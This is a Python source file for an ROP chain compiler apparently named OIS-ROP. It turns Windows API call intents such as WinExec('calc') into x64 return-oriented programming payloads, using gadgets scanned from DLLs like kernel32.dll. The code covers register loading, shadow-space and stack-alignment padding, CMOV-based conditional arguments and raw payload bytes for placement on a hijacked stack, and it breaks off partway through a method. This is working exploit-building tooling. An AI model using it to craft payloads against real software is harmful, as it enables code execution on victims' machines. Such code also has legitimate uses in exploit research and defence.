#!/usr/bin/env python3
"""
OIS-ROP: Chain Compiler
=========================

Takes high-level intent — API calls with arguments — and compiles
them into concrete ROP chains using gadgets available in the
taxonomy for a given PE.

The compiler resolves intent to gadgets at compile time against
whatever DLL version is provided. Same intent, different DLL → 
different chain addresses, same behavior.

Author: Chris Aziz / Bombadil Systems
"""

import struct
import pefile
from typing import Dict, List, Optional, Union, Tuple
from dataclasses import dataclass, field
from pathlib import Path

from .scanner import PEGadgetScanner, ScanResult
from .taxonomy import (
    GadgetClassifier, GadgetClass, Taxonomy, ClassifiedGadget,
)


# =============================================================================
# CHAIN INTENT — What the user wants to happen
# =============================================================================

@dataclass
class StringArg:
    """A string argument. The compiler places the string in the chain
    data and resolves the pointer at compile time."""
    value: str

    def __repr__(self):
        return f'String("{self.value}")'


@dataclass
class RawArg:
    """A raw integer/pointer argument."""
    value: int

    def __repr__(self):
        return f'0x{self.value:X}'


@dataclass
class ReturnValue:
    """Placeholder: use the return value (RAX) from a previous call."""
    call_index: int = 0  # Which prior call's return value (0 = most recent)

    def __repr__(self):
        return f'ReturnValue(call[{self.call_index}])'


@dataclass
class StackSlot:
    """Placeholder: a writable memory location on the stack.
    Used for output parameters that need a valid writable pointer
    (e.g., lpNumberOfBytesWritten in WriteFile).
    The runtime patches this to an actual stack address."""
    initial_value: int = 0

    def __repr__(self):
        return f'StackSlot()'


@dataclass
class ConditionalArg:
    """
    Conditional argument: select between two values based on a zero test.

    Emits a FLAG_SET → LOAD → CMOV gadget sequence that selects
    between if_zero and if_nonzero based on whether a test value is zero.

    CPU flags set by TEST are preserved through POP; RET sequences
    (neither modifies flags), enabling the separation of flag-setting
    from conditional selection — the core insight that makes this work
    in a linear ROP chain without branches.

    Condition sources:
      - int: explicit value loaded into a testable register
      - ReturnValue: test the previous call's return value (RAX)
        Note: ReturnValue uses the best available EAX-testing FLAG_SET.
        If only masked tests are available (test eax, mask), the zero
        detection is approximate — the compiler emits a warning.
    """
    test_value: Union[int, 'ReturnValue']   # What to test for zero
    if_zero: int                             # Selected when test == 0
    if_nonzero: int                          # Selected when test != 0

    def __repr__(self):
        cond = f'0x{self.test_value:X}' if isinstance(self.test_value, int) else str(self.test_value)
        return f'Cond({cond}: z=0x{self.if_zero:X}, nz=0x{self.if_nonzero:X})'


# Argument type union
Arg = Union[int, str, StringArg, RawArg, ReturnValue, StackSlot, ConditionalArg]


@dataclass
class Call:
    """A single API call to compile into the chain."""
    module: str       # DLL name: "kernel32.dll", "ntdll.dll", etc.
    function: str     # Export name: "WinExec", "Sleep", etc.
    args: List[Arg]   # Arguments in calling convention order

    def __repr__(self):
        args_str = ", ".join(str(a) for a in self.args)
        return f'Call({self.module}!{self.function}({args_str}))'


# =============================================================================
# CHAIN ENTRY — Annotated output
# =============================================================================

@dataclass
class ChainEntry:
    """A single QWORD in the compiled chain with annotation."""
    value: int
    role: str          # Human-readable: "gadget: LOAD_RCX", "data: arg1", etc.
    source: str = ""   # Where the gadget came from: "0x1234 in kernel32.dll"

    def __repr__(self):
        return f"0x{self.value:016X}  # {self.role}"


@dataclass
class CompiledChain:
    """A complete compiled ROP chain with metadata."""
    entries: List[ChainEntry] = field(default_factory=list)
    strings: Dict[int, str] = field(default_factory=dict)  # offset → string
    calls: List[Call] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    gadgets_used: Dict[str, str] = field(default_factory=dict)  # class → disasm

    @property
    def size(self) -> int:
        """Chain size in bytes."""
        return len(self.entries) * 8

    @property
    def qwords(self) -> int:
        """Number of QWORD entries."""
        return len(self.entries)

    def build(self) -> bytes:
        """Build the chain as raw bytes for stack placement."""
        return b''.join(
            struct.pack('<Q', entry.value & 0xFFFFFFFFFFFFFFFF)
            for entry in self.entries
        )

    def dump(self) -> str:
        """Human-readable chain dump."""
        lines = [
            f"Compiled Chain: {self.qwords} QWORDs ({self.size} bytes)",
            "-" * 72,
        ]
        for i, entry in enumerate(self.entries):
            lines.append(f"  [{i:3d}] {entry}")
        if self.strings:
            lines.append("")
            lines.append("String data appended after chain:")
            for offset, s in self.strings.items():
                lines.append(f"  +{offset:04X}: \"{s}\"")
        if self.warnings:
            lines.append("")
            lines.append("Warnings:")
            for w in self.warnings:
                lines.append(f"  ! {w}")
        return "\n".join(lines)

    def build_with_strings(self, base_address: int = 0) -> Tuple[bytes, Dict[int, int]]:
        """
        Build chain bytes with string data appended.
        Returns (full_payload, string_addresses) where string_addresses
        maps Call argument index to absolute address.

        Args:
            base_address: The memory address where the chain will be placed.
                          Used to compute absolute string pointers.
        """
        chain_bytes = self.build()
        string_data = b''
        string_addrs = {}

        for rel_offset, s in sorted(self.strings.items()):
            abs_addr = base_address + len(chain_bytes) + len(string_data)
            string_addrs[rel_offset] = abs_addr
            encoded = s.encode('ascii') + b'\x00'
            # Align to 8 bytes
            while len(encoded) % 8 != 0:
                encoded += b'\x00'
            string_data += encoded

        return chain_bytes + string_data, string_addrs


# =============================================================================
# COMPILER
# =============================================================================

class ChainCompiler:
    """
    Compiles high-level Call intents into ROP chains.

    Usage:
        scanner = PEGadgetScanner()
        scan = scanner.scan("kernel32.dll")
        classifier = GadgetClassifier()
        taxonomy = classifier.classify_scan(scan)

        compiler = ChainCompiler(taxonomy)
        compiler.add_export_table("kernel32.dll")

        chain = compiler.compile([
            Call("kernel32.dll", "WinExec", [StringArg("calc"), 1]),
        ])
    """

    # Extra STACK_ALIGN + padding rounds after each call.
    # Some APIs (Beep, MessageBox, etc.) use more stack than the
    # standard 0x20 shadow space during execution, corrupting chain
    # entries beyond the 4 shadow slots. Chaining additional
    # STACK_ALIGN + padding blocks gives deep-stack APIs room to
    # thrash without hitting the next gadget sequence.
    EXTRA_SHADOW_ROUNDS = 2

    # x64 calling convention: first 4 args go in registers
    ARG_REGISTERS = [
        GadgetClass.LOAD_RCX,
        GadgetClass.LOAD_RDX,
        GadgetClass.LOAD_R8,
        GadgetClass.LOAD_R9,
    ]

    # Fallback strategies: if a direct LOAD_X is unavailable,
    # try loading into RAX first then transferring.
    _FALLBACK_VIA_RAX = {
        GadgetClass.LOAD_RCX: GadgetClass.XFER_RAX_RCX,
        GadgetClass.LOAD_RDX: GadgetClass.XFER_RAX_RDX,
    }

    def __init__(self, taxonomy: Taxonomy):
        self.taxonomy = taxonomy
        self.exports: Dict[str, Dict[str, int]] = {}  # module → {func → rva}
        self._image_bases: Dict[str, int] = {}

    def add_export_table(self, pe_path: str):
        """
        Load the export table from a PE file.
        Maps function names to RVAs for chain resolution.
        """
        pe_path = str(pe_path)
        pe = pefile.PE(pe_path, fast_load=True)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']]
        )

        module_name = Path(pe_path).name.lower()
        self.exports[module_name] = {}
        self._image_bases[module_name] = pe.OPTIONAL_HEADER.ImageBase

        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    name = exp.name.decode('ascii', errors='replace')
                    self.exports[module_name][name] = exp.address
        pe.close()

    def resolve_function(self, module: str, function: str) -> Optional[int]:
        """Resolve a function to its RVA."""
        module_lower = module.lower()
        if not module_lower.endswith('.dll'):
            module_lower += '.dll'

        mod_exports = self.exports.get(module_lower, {})
        return mod_exports.get(function)

    def compile(self, calls: List[Call], exit_code: int = 0x99) -> CompiledChain:
        """
        Compile a sequence of API calls into a ROP chain.

        The chain handles:
        - Register setup for each argument (x64 calling convention)
        - Shadow space between calls
        - Stack alignment
        - String argument placement
        - Return value forwarding between calls
        - Clean exit via ExitThread

        Args:
            calls: List of Call intents to compile.
            exit_code: Exit code for the final ExitThread call.
                       Set to None to omit the exit.
        """
        chain = CompiledChain(calls=list(calls))
        string_accumulator: Dict[int, str] = {}
        string_counter = 0

        # Pre-check: do we have the gadgets we need (directly or via fallback)?
        required_classes = set()
        for call in calls:
            for i, arg in enumerate(call.args[:4]):
                if not isinstance(arg, ReturnValue):
                    required_classes.add(self.ARG_REGISTERS[i])

        for cls in required_classes:
            if not self.taxonomy.has(cls):
                # Check fallback: LOAD_RAX + XFER_RAX_TARGET
                xfer_class = self._FALLBACK_VIA_RAX.get(cls)
                has_fallback = (
                    xfer_class is not None
                    and self.taxonomy.has(GadgetClass.LOAD_RAX)
                    and self.taxonomy.has(xfer_class)
                )
                if not has_fallback:
                    chain.errors.append(
                        f"Missing required gadget class: {cls.name} "
                        f"(no direct gadget and no RAX fallback available)"
                    )
        if chain.errors:
            return chain

        # Check for shadow space skip gadget
        align_gadgets = self.taxonomy.stack_align_gadgets()
        shadow_skip = None
        shadow_skip_delta = 0

        # Prefer add rsp, 0x28 (skip 4 shadow slots + 1 alignment = 5 QWORDs)
        for delta in [0x28, 0x20, 0x30, 0x38]:
            if delta in align_gadgets:
                best = align_gadgets[delta][0]
                shadow_skip = best
                shadow_skip_delta = delta
                chain.gadgets_used[f'STACK_ALIGN_{delta:#x}'] = best.gadget.instructions
                break

        # Compile each call
        for call_idx, call in enumerate(calls):
            self._compile_call(
                call, call_idx, chain,
                string_accumulator, shadow_skip, shadow_skip_delta,
                is_last=(call_idx == len(calls) - 1),
            )
            string_counter += 1

        # Append ExitThread if exit_code is specified
        if exit_code is not None:
            self._compile_exit(chain, exit_code)

        chain.strings = string_accumulator
        return chain

    def _compile_call(
        self,
        call: Call,
        call_idx: int,
        chain: CompiledChain,
        strings: Dict[int, str],
        shadow_skip: Optional[ClassifiedGadget],
        shadow_skip_delta: int,
        is_last: bool,
    ):
        """Compile a single API call into chain entries."""

        # Resolve function address
        func_rva = self.resolve_function(call.module, call.function)
        if func_rva is None:
            chain.errors.append(
                f"Cannot resolve {call.module}!{call.function} — "
                f"call add_export_table() for {call.module}"
            )
            return

        # Normalize arguments
        normalized_args = []
        for arg in call.args:
            if isinstance(arg, int):
                normalized_args.append(RawArg(arg))
            elif isinstance(arg, str):
                normalized_args.append(StringArg(arg))
            elif isinstance(arg, (RawArg, StringArg, ReturnValue, StackSlot, ConditionalArg)):
                normalized_args.append(arg)
            else:
                chain.errors.append(f"Unknown argument type: {type(arg)}")
                return

        # Set up register arguments (first 4)
        for i, arg in enumerate(normalized_args[:4]):
            reg_class = self.ARG_REGISTERS[i]

            if isinstance(arg, ReturnValue):
                # Need to transfer RAX to the target register
                self._compile_return_transfer(
                    chain, reg_class, call, i
                )
                continue

            if isinstance(arg, ConditionalArg):
                # Emit FLAG_SET → LOAD → CMOV → XFER sequence
                self._compile_conditional_arg(
                    chain, reg_class, arg, i, call_idx
                )
                continue

            # Get the best gadget for loading this register
            gadget = self.taxonomy.best(reg_class)
            if gadget is None:
                # Fallback: load via RAX then transfer
                xfer_class = self._FALLBACK_VIA_RAX.get(reg_class)
                if (xfer_class
                        and self.taxonomy.has(GadgetClass.LOAD_RAX)
                        and self.taxonomy.has(xfer_class)):
                    self._compile_fallback_load(
                        chain, reg_class, xfer_class, arg, i, strings
                    )
                    continue
                chain.errors.append(
                    f"No gadget for {reg_class.name} in call to "
                    f"{call.module}!{call.function}"
                )
                return

            chain.gadgets_used[reg_class.name] = gadget.gadget.instructions

            # If this gadget has memory-reading side effects (e.g., cmp [rax-9])
            # AND a prior function call may have trashed RAX, we need to prime
            # RAX to a safe readable address first. The gadget's own address
            # (in signed DLL image memory) is always a valid readable target.
            if (call_idx > 0
                    and gadget.notes
                    and 'reads memory' in gadget.notes
                    and self.taxonomy.has(GadgetClass.LOAD_RAX)):
                rax_gadget = self.taxonomy.best(GadgetClass.LOAD_RAX)
                chain.entries.append(ChainEntry(
                    value=rax_gadget.gadget.offset,
                    role=f"gadget: LOAD_RAX ({rax_gadget.gadget.instructions}) [prime RAX for side-effect read]",
                    source=f"0x{rax_gadget.gadget.offset:X} in {rax_gadget.gadget.module_path}",
                ))
                # Load the LOAD_RDX gadget's own address as a safe readable value
                chain.entries.append(ChainEntry(
                    value=gadget.gadget.offset,
                    role=f"data: safe readable addr for [{reg_class.name} side-effect]",
                    source=f"0x{gadget.gadget.offset:X} (gadget image addr)",
                ))
                if rax_gadget.stack_delta > 8:
                    extra = (rax_gadget.stack_delta - 8) // 8
                    for _ in range(extra):
                        chain.entries.append(ChainEntry(
                            value=0,
                            role="padding: LOAD_RAX side-effect pop",
                        ))

            # Add gadget address
            chain.entries.append(ChainEntry(
                value=gadget.gadget.offset,
                role=f"gadget: {reg_class.name} ({gadget.gadget.instructions})",
                source=f"0x{gadget.gadget.offset:X} in {gadget.gadget.module_path}",
            ))

            # Add the value to load
            if isinstance(arg, RawArg):
                chain.entries.append(ChainEntry(
                    value=arg.value,
                    role=f"data: arg{i+1} = 0x{arg.value:X}",
                ))
            elif isinstance(arg, StringArg):
                # Placeholder — will be patched when base address is known
                placeholder = 0xDEAD000000000000 + len(strings)
                strings[placeholder] = arg.value
                chain.entries.append(ChainEntry(
                    value=placeholder,
                    role=f"data: arg{i+1} = &\"{arg.value}\" (placeholder, patch at placement)",
                ))
            elif isinstance(arg, StackSlot):
                # Writable stack location — runtime patches to actual address.
                # Use a recognizable placeholder the runtime can find.
                slot_placeholder = 0xDEAD510700000000 + len(chain.entries)
                chain.entries.append(ChainEntry(
                    value=slot_placeholder,
                    role=f"data: arg{i+1} = &StackSlot (writable, placeholder 0x{slot_placeholder:X})",
                ))

            # Handle multi-pop side effects: if this gadget pops extra
            # registers, we need dummy values on the stack for those pops
            if gadget.stack_delta > 8:
                extra_pops = (gadget.stack_delta - 8) // 8
                for _ in range(extra_pops):
                    chain.entries.append(ChainEntry(
                        value=0,
                        role=f"padding: side-effect pop from {reg_class.name} gadget",
                    ))

        # Stack alignment: x64 ABI requires RSP ≡ 8 (mod 16) at function entry.
        #
        # RSP starts at new_rsp + 8 (mod 16 = 8, set by runtime).
        # Each entry consumed from the stack adds 8 to RSP.
        # After N entries consumed: RSP = (mod 16 = 8) + N*8.
        # For RSP mod 16 = 8 at function entry, N must be EVEN.
        #
        # N = entry_count_before_call (entries consumed from stack, excluding
        # entry[0] which is handled by RIP, but including the function address
        # entry which is consumed by the final ret into the function).
        # Total N = entry_count_before_call (stack entries before func) + 0
        #   (because entry[0] via RIP cancels with func_addr entry).
        #
        # If entry_count is EVEN → N is even → alignment correct → no padding.
        # If entry_count is ODD → N is odd → alignment wrong → add RET_SLED.
        entry_count_before_call = len(chain.entries)
        if entry_count_before_call % 2 != 0:
            ret_sled = self.taxonomy.best(GadgetClass.RET_SLED)
            if ret_sled:
                chain.entries.append(ChainEntry(
                    value=ret_sled.gadget.offset,
                    role="gadget: RET_SLED (stack alignment)",
                ))

        # Add the function address — ret will jump here
        chain.entries.append(ChainEntry(
            value=func_rva,
            role=f"target: {call.module}!{call.function}",
            source=f"RVA 0x{func_rva:X}",
        ))

        # After the function starts, the stack layout from its perspective is:
        #   RSP+0x00 = return address
        #   RSP+0x08 = shadow slot 1 (callee may spill RCX)
        #   RSP+0x10 = shadow slot 2 (callee may spill RDX)
        #   RSP+0x18 = shadow slot 3 (callee may spill R8)
        #   RSP+0x20 = shadow slot 4 (callee may spill R9)
        #   RSP+0x28 = arg5 (if any)
        #   RSP+0x30 = arg6 (if any)
        #   ...
        #
        # After the function returns (rets to our STACK_ALIGN gadget),
        # RSP points to shadow slot 1. STACK_ALIGN must skip:
        #   4 shadow slots + stack_arg_count slots = (4 + N) * 8 bytes
        # Then ret pops the next gadget.

        stack_args = normalized_args[4:]  # Args beyond the first 4
        n_stack_args = len(stack_args)
        required_skip = (4 + n_stack_args) * 8

        # Always add return handling: STACK_ALIGN + shadow + stack args.
        # Every call needs this — even the last one, because the callee
        # writes to shadow space and we need to skip past it to reach
        # ExitThread or the next call.
        #
        # Use the pre-checked shadow_skip gadget and its verified delta
        # rather than a per-call taxonomy lookup. The taxonomy's
        # stack_align_gadgets() can misclassify a gadget's delta bucket
        # (e.g., add rsp, 0x28 appearing under the 0x20 key), causing
        # the chain to place too few padding slots and crash on the
        # second call.
        skip_gadget = shadow_skip
        if shadow_skip is not None and shadow_skip_delta >= required_skip:
            # Pre-check gadget covers this call's skip requirement.
            # If it overshoots, add extra padding.
            if shadow_skip_delta > required_skip:
                n_stack_args += (shadow_skip_delta - required_skip) // 8
                required_skip = shadow_skip_delta
        else:
            # Pre-check gadget can't cover this call (more stack args).
            # Fall through to dynamic lookup for a larger gadget.
            skip_gadget = None
            align_by_delta = self.taxonomy.stack_align_gadgets()
            for try_delta in sorted(align_by_delta.keys()):
                if try_delta >= required_skip:
                    skip_gadget = align_by_delta[try_delta][0]
                    n_stack_args += (try_delta - required_skip) // 8
                    required_skip = try_delta
                    break

        if skip_gadget is None:
            chain.warnings.append(
                f"No STACK_ALIGN gadget for 0x{required_skip:X} skip "
                f"after {call.function}. Chain may crash."
            )
            if align_by_delta:
                max_delta = max(align_by_delta.keys())
                skip_gadget = align_by_delta[max_delta][0]
                required_skip = max_delta

        if skip_gadget:
            label = "shadow + stack args" if n_stack_args > 0 else "shadow space"
            chain.entries.append(ChainEntry(
                value=skip_gadget.gadget.offset,
                role=f"gadget: STACK_ALIGN (skip 0x{required_skip:X} {label})",
                source=f"0x{skip_gadget.gadget.offset:X} in {skip_gadget.gadget.module_path}",
            ))

        for j in range(4):
            chain.entries.append(ChainEntry(
                value=0xDEADBEEF,
                role=f"shadow: slot {j+1}/4",
            ))

        for j, arg in enumerate(stack_args):
            arg_num = j + 5
            if isinstance(arg, RawArg):
                chain.entries.append(ChainEntry(
                    value=arg.value,
                    role=f"stack_arg: arg{arg_num} = 0x{arg.value:X}",
                ))
            elif isinstance(arg, StringArg):
                placeholder = 0xDEAD000000000000 + len(strings)
                strings[placeholder] = arg.value
                chain.entries.append(ChainEntry(
                    value=placeholder,
                    role=f"stack_arg: arg{arg_num} = &\"{arg.value}\" (placeholder)",
                ))
            elif isinstance(arg, ReturnValue):
                chain.errors.append(
                    f"ReturnValue in stack arg position {arg_num} not yet supported"
                )
                return

        total_slots_placed = 4 + len(stack_args)
        total_slots_needed = required_skip // 8
        for j in range(total_slots_needed - total_slots_placed):
            chain.entries.append(ChainEntry(
                value=0xDEADBEEF,
                role=f"padding: STACK_ALIGN overshoot slot",
            ))

        # Extra STACK_ALIGN + padding rounds for deep-stack APIs.
        # Each round: STACK_ALIGN rets into the next STACK_ALIGN,
        # which skips another set of padding slots. The last round's
        # ret lands on the next real gadget in the chain.
        if skip_gadget and self.EXTRA_SHADOW_ROUNDS > 0:
            slots_per_round = required_skip // 8
            for extra in range(self.EXTRA_SHADOW_ROUNDS):
                chain.entries.append(ChainEntry(
                    value=skip_gadget.gadget.offset,
                    role=f"gadget: STACK_ALIGN (deep-stack guard round {extra+1}/{self.EXTRA_SHADOW_ROUNDS})",
                    source=f"0x{skip_gadget.gadget.offset:X} in {skip_gadget.gadget.module_path}",
                ))
                for j in range(slots_per_round):
                    chain.entries.append(ChainEntry(
                        value=0xDEADBEEF,
                        role=f"deep_pad: round {extra+1} slot {j+1}/{slots_per_round}",
                    ))

    def _compile_fallback_load(
        self,
        chain: CompiledChain,
        target_class: GadgetClass,
        xfer_class: GadgetClass,
        arg: Union[RawArg, StringArg],
        arg_idx: int,
        strings: Dict[int, str],
    ):
        """
        Two-step register load: pop value into RAX, then transfer to target.
        Used when no direct LOAD_TARGET gadget exists.

        Example: LOAD_RDX missing → pop rax; ret (load value) then
        mov rdx, rax; ret (transfer).
        """
        load_rax = self.taxonomy.best(GadgetClass.LOAD_RAX)
        xfer = self.taxonomy.best(xfer_class)

        # Step 1: pop rax; ret — load the value
        chain.entries.append(ChainEntry(
            value=load_rax.gadget.offset,
            role=f"gadget: LOAD_RAX ({load_rax.gadget.instructions}) [fallback for {target_class.name}]",
            source=f"0x{load_rax.gadget.offset:X} in {load_rax.gadget.module_path}",
        ))

        if isinstance(arg, RawArg):
            chain.entries.append(ChainEntry(
                value=arg.value,
                role=f"data: arg{arg_idx+1} = 0x{arg.value:X} (via RAX fallback)",
            ))
        elif isinstance(arg, StringArg):
            placeholder = 0xDEAD000000000000 + len(strings)
            strings[placeholder] = arg.value
            chain.entries.append(ChainEntry(
                value=placeholder,
                role=f"data: arg{arg_idx+1} = &\"{arg.value}\" (via RAX fallback, placeholder)",
            ))

        # Handle multi-pop side effects on the LOAD_RAX gadget
        if load_rax.stack_delta > 8:
            extra_pops = (load_rax.stack_delta - 8) // 8
            for _ in range(extra_pops):
                chain.entries.append(ChainEntry(
                    value=0,
                    role=f"padding: side-effect pop from LOAD_RAX fallback",
                ))

        # Step 2: mov target, rax; ret — transfer
        chain.entries.append(ChainEntry(
            value=xfer.gadget.offset,
            role=f"gadget: {xfer_class.name} ({xfer.gadget.instructions}) [fallback transfer]",
            source=f"0x{xfer.gadget.offset:X} in {xfer.gadget.module_path}",
        ))

        # Handle side effects on the transfer gadget
        if xfer.stack_delta > 0:
            extra_pops = xfer.stack_delta // 8
            for _ in range(extra_pops):
                chain.entries.append(ChainEntry(
                    value=0,
                    role=f"padding: side-effect pop from {xfer_class.name} transfer",
                ))

        chain.gadgets_used[f'{target_class.name}_fallback'] = (
            f"{load_rax.gadget.instructions} → {xfer.gadget.instructions}"
        )
        chain.warnings.append(
            f"{target_class.name}: no direct gadget. Using two-step via RAX: "
            f"{load_rax.gadget.instructions} → {xfer.gadget.instructions}"
        )

    def _compile_conditional_arg(
        self,
        chain: CompiledChain,
        target_class: GadgetClass,
        cond: ConditionalArg,
        arg_idx: int,
        call_idx: int,
    ):
        """
        Compile a conditional argument: FLAG_SET → LOAD → CMOV → XFER.

        CPU flags set by TEST survive through POP; RET sequences
        (neither modifies flags). This enables:

            LOAD_RSI(condition)  →  test esi, esi  →  pop rax(default)
            →  pop rdx(alt)  →  cmove rax, rdx  →  mov rcx, rax

        For ReturnValue conditions, the return value (RAX) is tested
        BEFORE being overwritten by the default value load. Flags
        persist through the overwrite.
        """
        # --- Select FLAG_SET gadget ---
        flag_gadget, flag_reg = self._select_flag_set(cond)
        if flag_gadget is None:
            chain.errors.append(
                f"ConditionalArg at arg{arg_idx+1}: no usable FLAG_SET gadget. "
                f"Need a register-only test instruction (test reg, reg/imm) in the taxonomy."
            )
            return

        # --- Select CMOV gadget ---
        # Strategy: try to find a CMOV whose destination matches the target
        # argument register FIRST. This eliminates the XFER step entirely,
        # which can save 10+ QWORDs of padding from expensive XFER gadgets.
        #
        # Fallback: any CMOV + XFER to route the result.

        # Map target class to register names for direct-path search
        _TARGET_REGS = {
            GadgetClass.LOAD_RCX: {'rcx', 'ecx'},
            GadgetClass.LOAD_RDX: {'rdx', 'edx'},
            GadgetClass.LOAD_RAX: {'rax', 'eax'},
        }
        target_regs = _TARGET_REGS.get(target_class)
        if target_regs is None:
            chain.errors.append(
                f"ConditionalArg at arg{arg_idx+1}: cannot route CMOV result "
                f"to {target_class.name}. Only RCX, RDX, and RAX targets supported."
            )
            return

        # Try direct path: CMOV destination = target register (no XFER needed)
        cmov_gadget, cmov_dst, cmov_src = self._select_cmov('e', preferred_dst=target_regs)
        xfer_needed = None
        if cmov_gadget is not None:
            val_dst = cond.if_nonzero
            val_src = cond.if_zero
        else:
            # Try cmovne with direct path (swap values)
            cmov_gadget, cmov_dst, cmov_src = self._select_cmov('ne', preferred_dst=target_regs)
            if cmov_gadget is not None:
                val_dst = cond.if_zero
                val_src = cond.if_nonzero
            else:
                # Fallback: any CMOV + XFER to route result
                cmov_gadget, cmov_dst, cmov_src = self._select_cmov('e')
                if cmov_gadget is not None:
                    val_dst = cond.if_nonzero
                    val_src = cond.if_zero
                else:
                    cmov_gadget, cmov_dst, cmov_src = self._select_cmov('ne')
                    if cmov_gadget is not None:
                        val_dst = cond.if_zero
                        val_src = cond.if_nonzero
                    else:
                        chain.errors.append(
                            f"ConditionalArg at arg{arg_idx+1}: no usable CMOV gadget "
                            f"with condition 'e' or 'ne'."
                        )
                        return

                # Determine XFER needed for fallback path
                result_reg = cmov_dst.lower()
                if result_reg in ('eax', 'rax') and target_class == GadgetClass.LOAD_RCX:
                    xfer_needed = GadgetClass.XFER_RAX_RCX
                elif result_reg in ('eax', 'rax') and target_class == GadgetClass.LOAD_RDX:
                    xfer_needed = GadgetClass.XFER_RAX_RDX
                elif result_reg not in target_regs:
                    chain.errors.append(
                        f"ConditionalArg at arg{arg_idx+1}: CMOV result in {cmov_dst}, "
                        f"no route to {target_class.name}."
                    )
                    return

                if xfer_needed and not self.taxonomy.has(xfer_needed):
                    chain.errors.append(
                        f"ConditionalArg at arg{arg_idx+1}: need {xfer_needed.name} "
                        f"to route result to {target_class.name}, but no gadget available."
                    )
                    return

        # Map CMOV operand registers to LOAD classes
        dst_load = self._reg_to_load_class(cmov_dst)
        src_load = self._reg_to_load_class(cmov_src)

        # --- Emit the sequence ---

        # Step 1: Set up condition and test it
        is_retval = isinstance(cond.test_value, ReturnValue)

        if not is_retval:
            # Load condition value into the FLAG_SET register
            flag_load = self._reg_to_load_class(flag_reg)
            if flag_load and self.taxonomy.has(flag_load):
                load_g = self.taxonomy.best(flag_load)
                chain.entries.append(ChainEntry(
                    value=load_g.gadget.offset,
                    role=f"gadget: {flag_load.name} ({load_g.gadget.instructions}) [load condition]",
                    source=f"0x{load_g.gadget.offset:X} in {load_g.gadget.module_path}",
                ))
                chain.entries.append(ChainEntry(
                    value=cond.test_value,
                    role=f"data: condition test value = 0x{cond.test_value:X}",
                ))
                self._emit_side_effect_padding(chain, load_g, flag_load.name, data_pops=1)
            else:
                chain.errors.append(
                    f"ConditionalArg at arg{arg_idx+1}: cannot load FLAG_SET "
                    f"register {flag_reg} — no {flag_load} gadget."
                )
                return

        # Step 2: FLAG_SET — test the condition register
        chain.entries.append(ChainEntry(
            value=flag_gadget.gadget.offset,
            role=f"gadget: FLAG_SET ({flag_gadget.gadget.instructions}) [set ZF]",
            source=f"0x{flag_gadget.gadget.offset:X} in {flag_gadget.gadget.module_path}",
        ))
        self._emit_side_effect_padding(chain, flag_gadget, "FLAG_SET", data_pops=0)

        if is_retval:
            # Parse the mask from the FLAG_SET notes for the warning
            notes = flag_gadget.notes
            if '0x' in notes:
                chain.warnings.append(
                    f"ConditionalArg at arg{arg_idx+1}: return value tested via "
                    f"masked FLAG_SET ({flag_gadget.gadget.instructions}). "
                    f"Zero detection is exact, but nonzero detection may have "
                    f"false negatives for values where (retval & mask) == 0."
                )

        # Step 3: Load CMOV destination register (default value — flags preserved)
        dst_gadget = self.taxonomy.best(dst_load)
        chain.entries.append(ChainEntry(
            value=dst_gadget.gadget.offset,
            role=f"gadget: {dst_load.name} ({dst_gadget.gadget.instructions}) [CMOV default]",
            source=f"0x{dst_gadget.gadget.offset:X} in {dst_gadget.gadget.module_path}",
        ))
        chain.entries.append(ChainEntry(
            value=val_dst,
            role=f"data: CMOV default = 0x{val_dst:X} (flags preserved through pop)",
        ))
        self._emit_side_effect_padding(chain, dst_gadget, dst_load.name, data_pops=1)

        # Step 4: Load CMOV source register (alternative value — flags preserved)
        src_gadget = self.taxonomy.best(src_load)
        chain.entries.append(ChainEntry(
            value=src_gadget.gadget.offset,
            role=f"gadget: {src_load.name} ({src_gadget.gadget.instructions}) [CMOV alternate]",
            source=f"0x{src_gadget.gadget.offset:X} in {src_gadget.gadget.module_path}",
        ))
        chain.entries.append(ChainEntry(
            value=val_src,
            role=f"data: CMOV alternate = 0x{val_src:X} (flags preserved through pop)",
        ))
        self._emit_side_effect_padding(chain, src_gadget, src_load.name, data_pops=1)

        # Step 5: CMOV — conditional select
        chain.entries.append(ChainEntry(
            value=cmov_gadget.gadget.offset,
            role=f"gadget: CMOV ({cmov_gadget.gadget.instructions}) [conditional select]",
            source=f"0x{cmov_gadget.gadget.offset:X} in {cmov_gadget.gadget.module_path}",
        ))
        self._emit_side_effect_padding(chain, cmov_gadget, "CMOV", data_pops=0)

        # Step 6: Route result to target register (if needed)
        if xfer_needed:
            xfer_gadget = self.taxonomy.best(xfer_needed)
            chain.entries.append(ChainEntry(
                value=xfer_gadget.gadget.offset,
                role=f"gadget: {xfer_needed.name} ({xfer_gadget.gadget.instructions}) [route conditional result]",
                source=f"0x{xfer_gadget.gadget.offset:X} in {xfer_gadget.gadget.module_path}",
            ))
            self._emit_side_effect_padding(chain, xfer_gadget, xfer_needed.name, data_pops=0)

        chain.gadgets_used[f'COND_arg{arg_idx+1}'] = (
            f"{flag_gadget.gadget.instructions} → "
            f"{cmov_gadget.gadget.instructions}"
        )

    def _select_flag_set(
        self, cond: ConditionalArg
    ) -> Tuple[Optional[ClassifiedGadget], str]:
        """
        Select the best FLAG_SET gadget for a conditional argument.

        For constant conditions: prefer 'test reg, reg' (perfect zero test)
        where we can load the register.
        For ReturnValue: prefer gadgets that test EAX/RAX directly.

        Returns (gadget, tested_register) or (None, "").
        """
        is_retval = isinstance(cond.test_value, ReturnValue)
        candidates = self.taxonomy.get(GadgetClass.FLAG_SET)

        best = None
        best_reg = ""
        best_score = -1.0

        for g in candidates:
            if g.quality < 0.5:
                continue  # Skip fragile/corrupting gadgets

            reg = self._parse_flag_set_register(g.notes)
            if not reg:
                continue

            if is_retval:
                # For return values, we need a gadget that tests EAX/RAX
                # because the return value is already there
                if reg not in ('eax', 'rax'):
                    continue
                score = g.quality
            else:
                # For constant conditions, prefer test reg, reg (perfect zero test)
                # and ensure we can load the register
                load_class = self._reg_to_load_class(reg)
                if load_class is None or not self.taxonomy.has(load_class):
                    continue
                # Prefer self-test (test esi, esi) over masked (test eax, 0x...)
                notes_lower = g.notes.lower()
                is_self_test = ',' in notes_lower and notes_lower.split(',')[0].strip() == notes_lower.split(',')[1].strip()
                score = g.quality + (0.5 if is_self_test else 0.0)

            if score > best_score:
                best = g
                best_reg = reg
                best_score = score

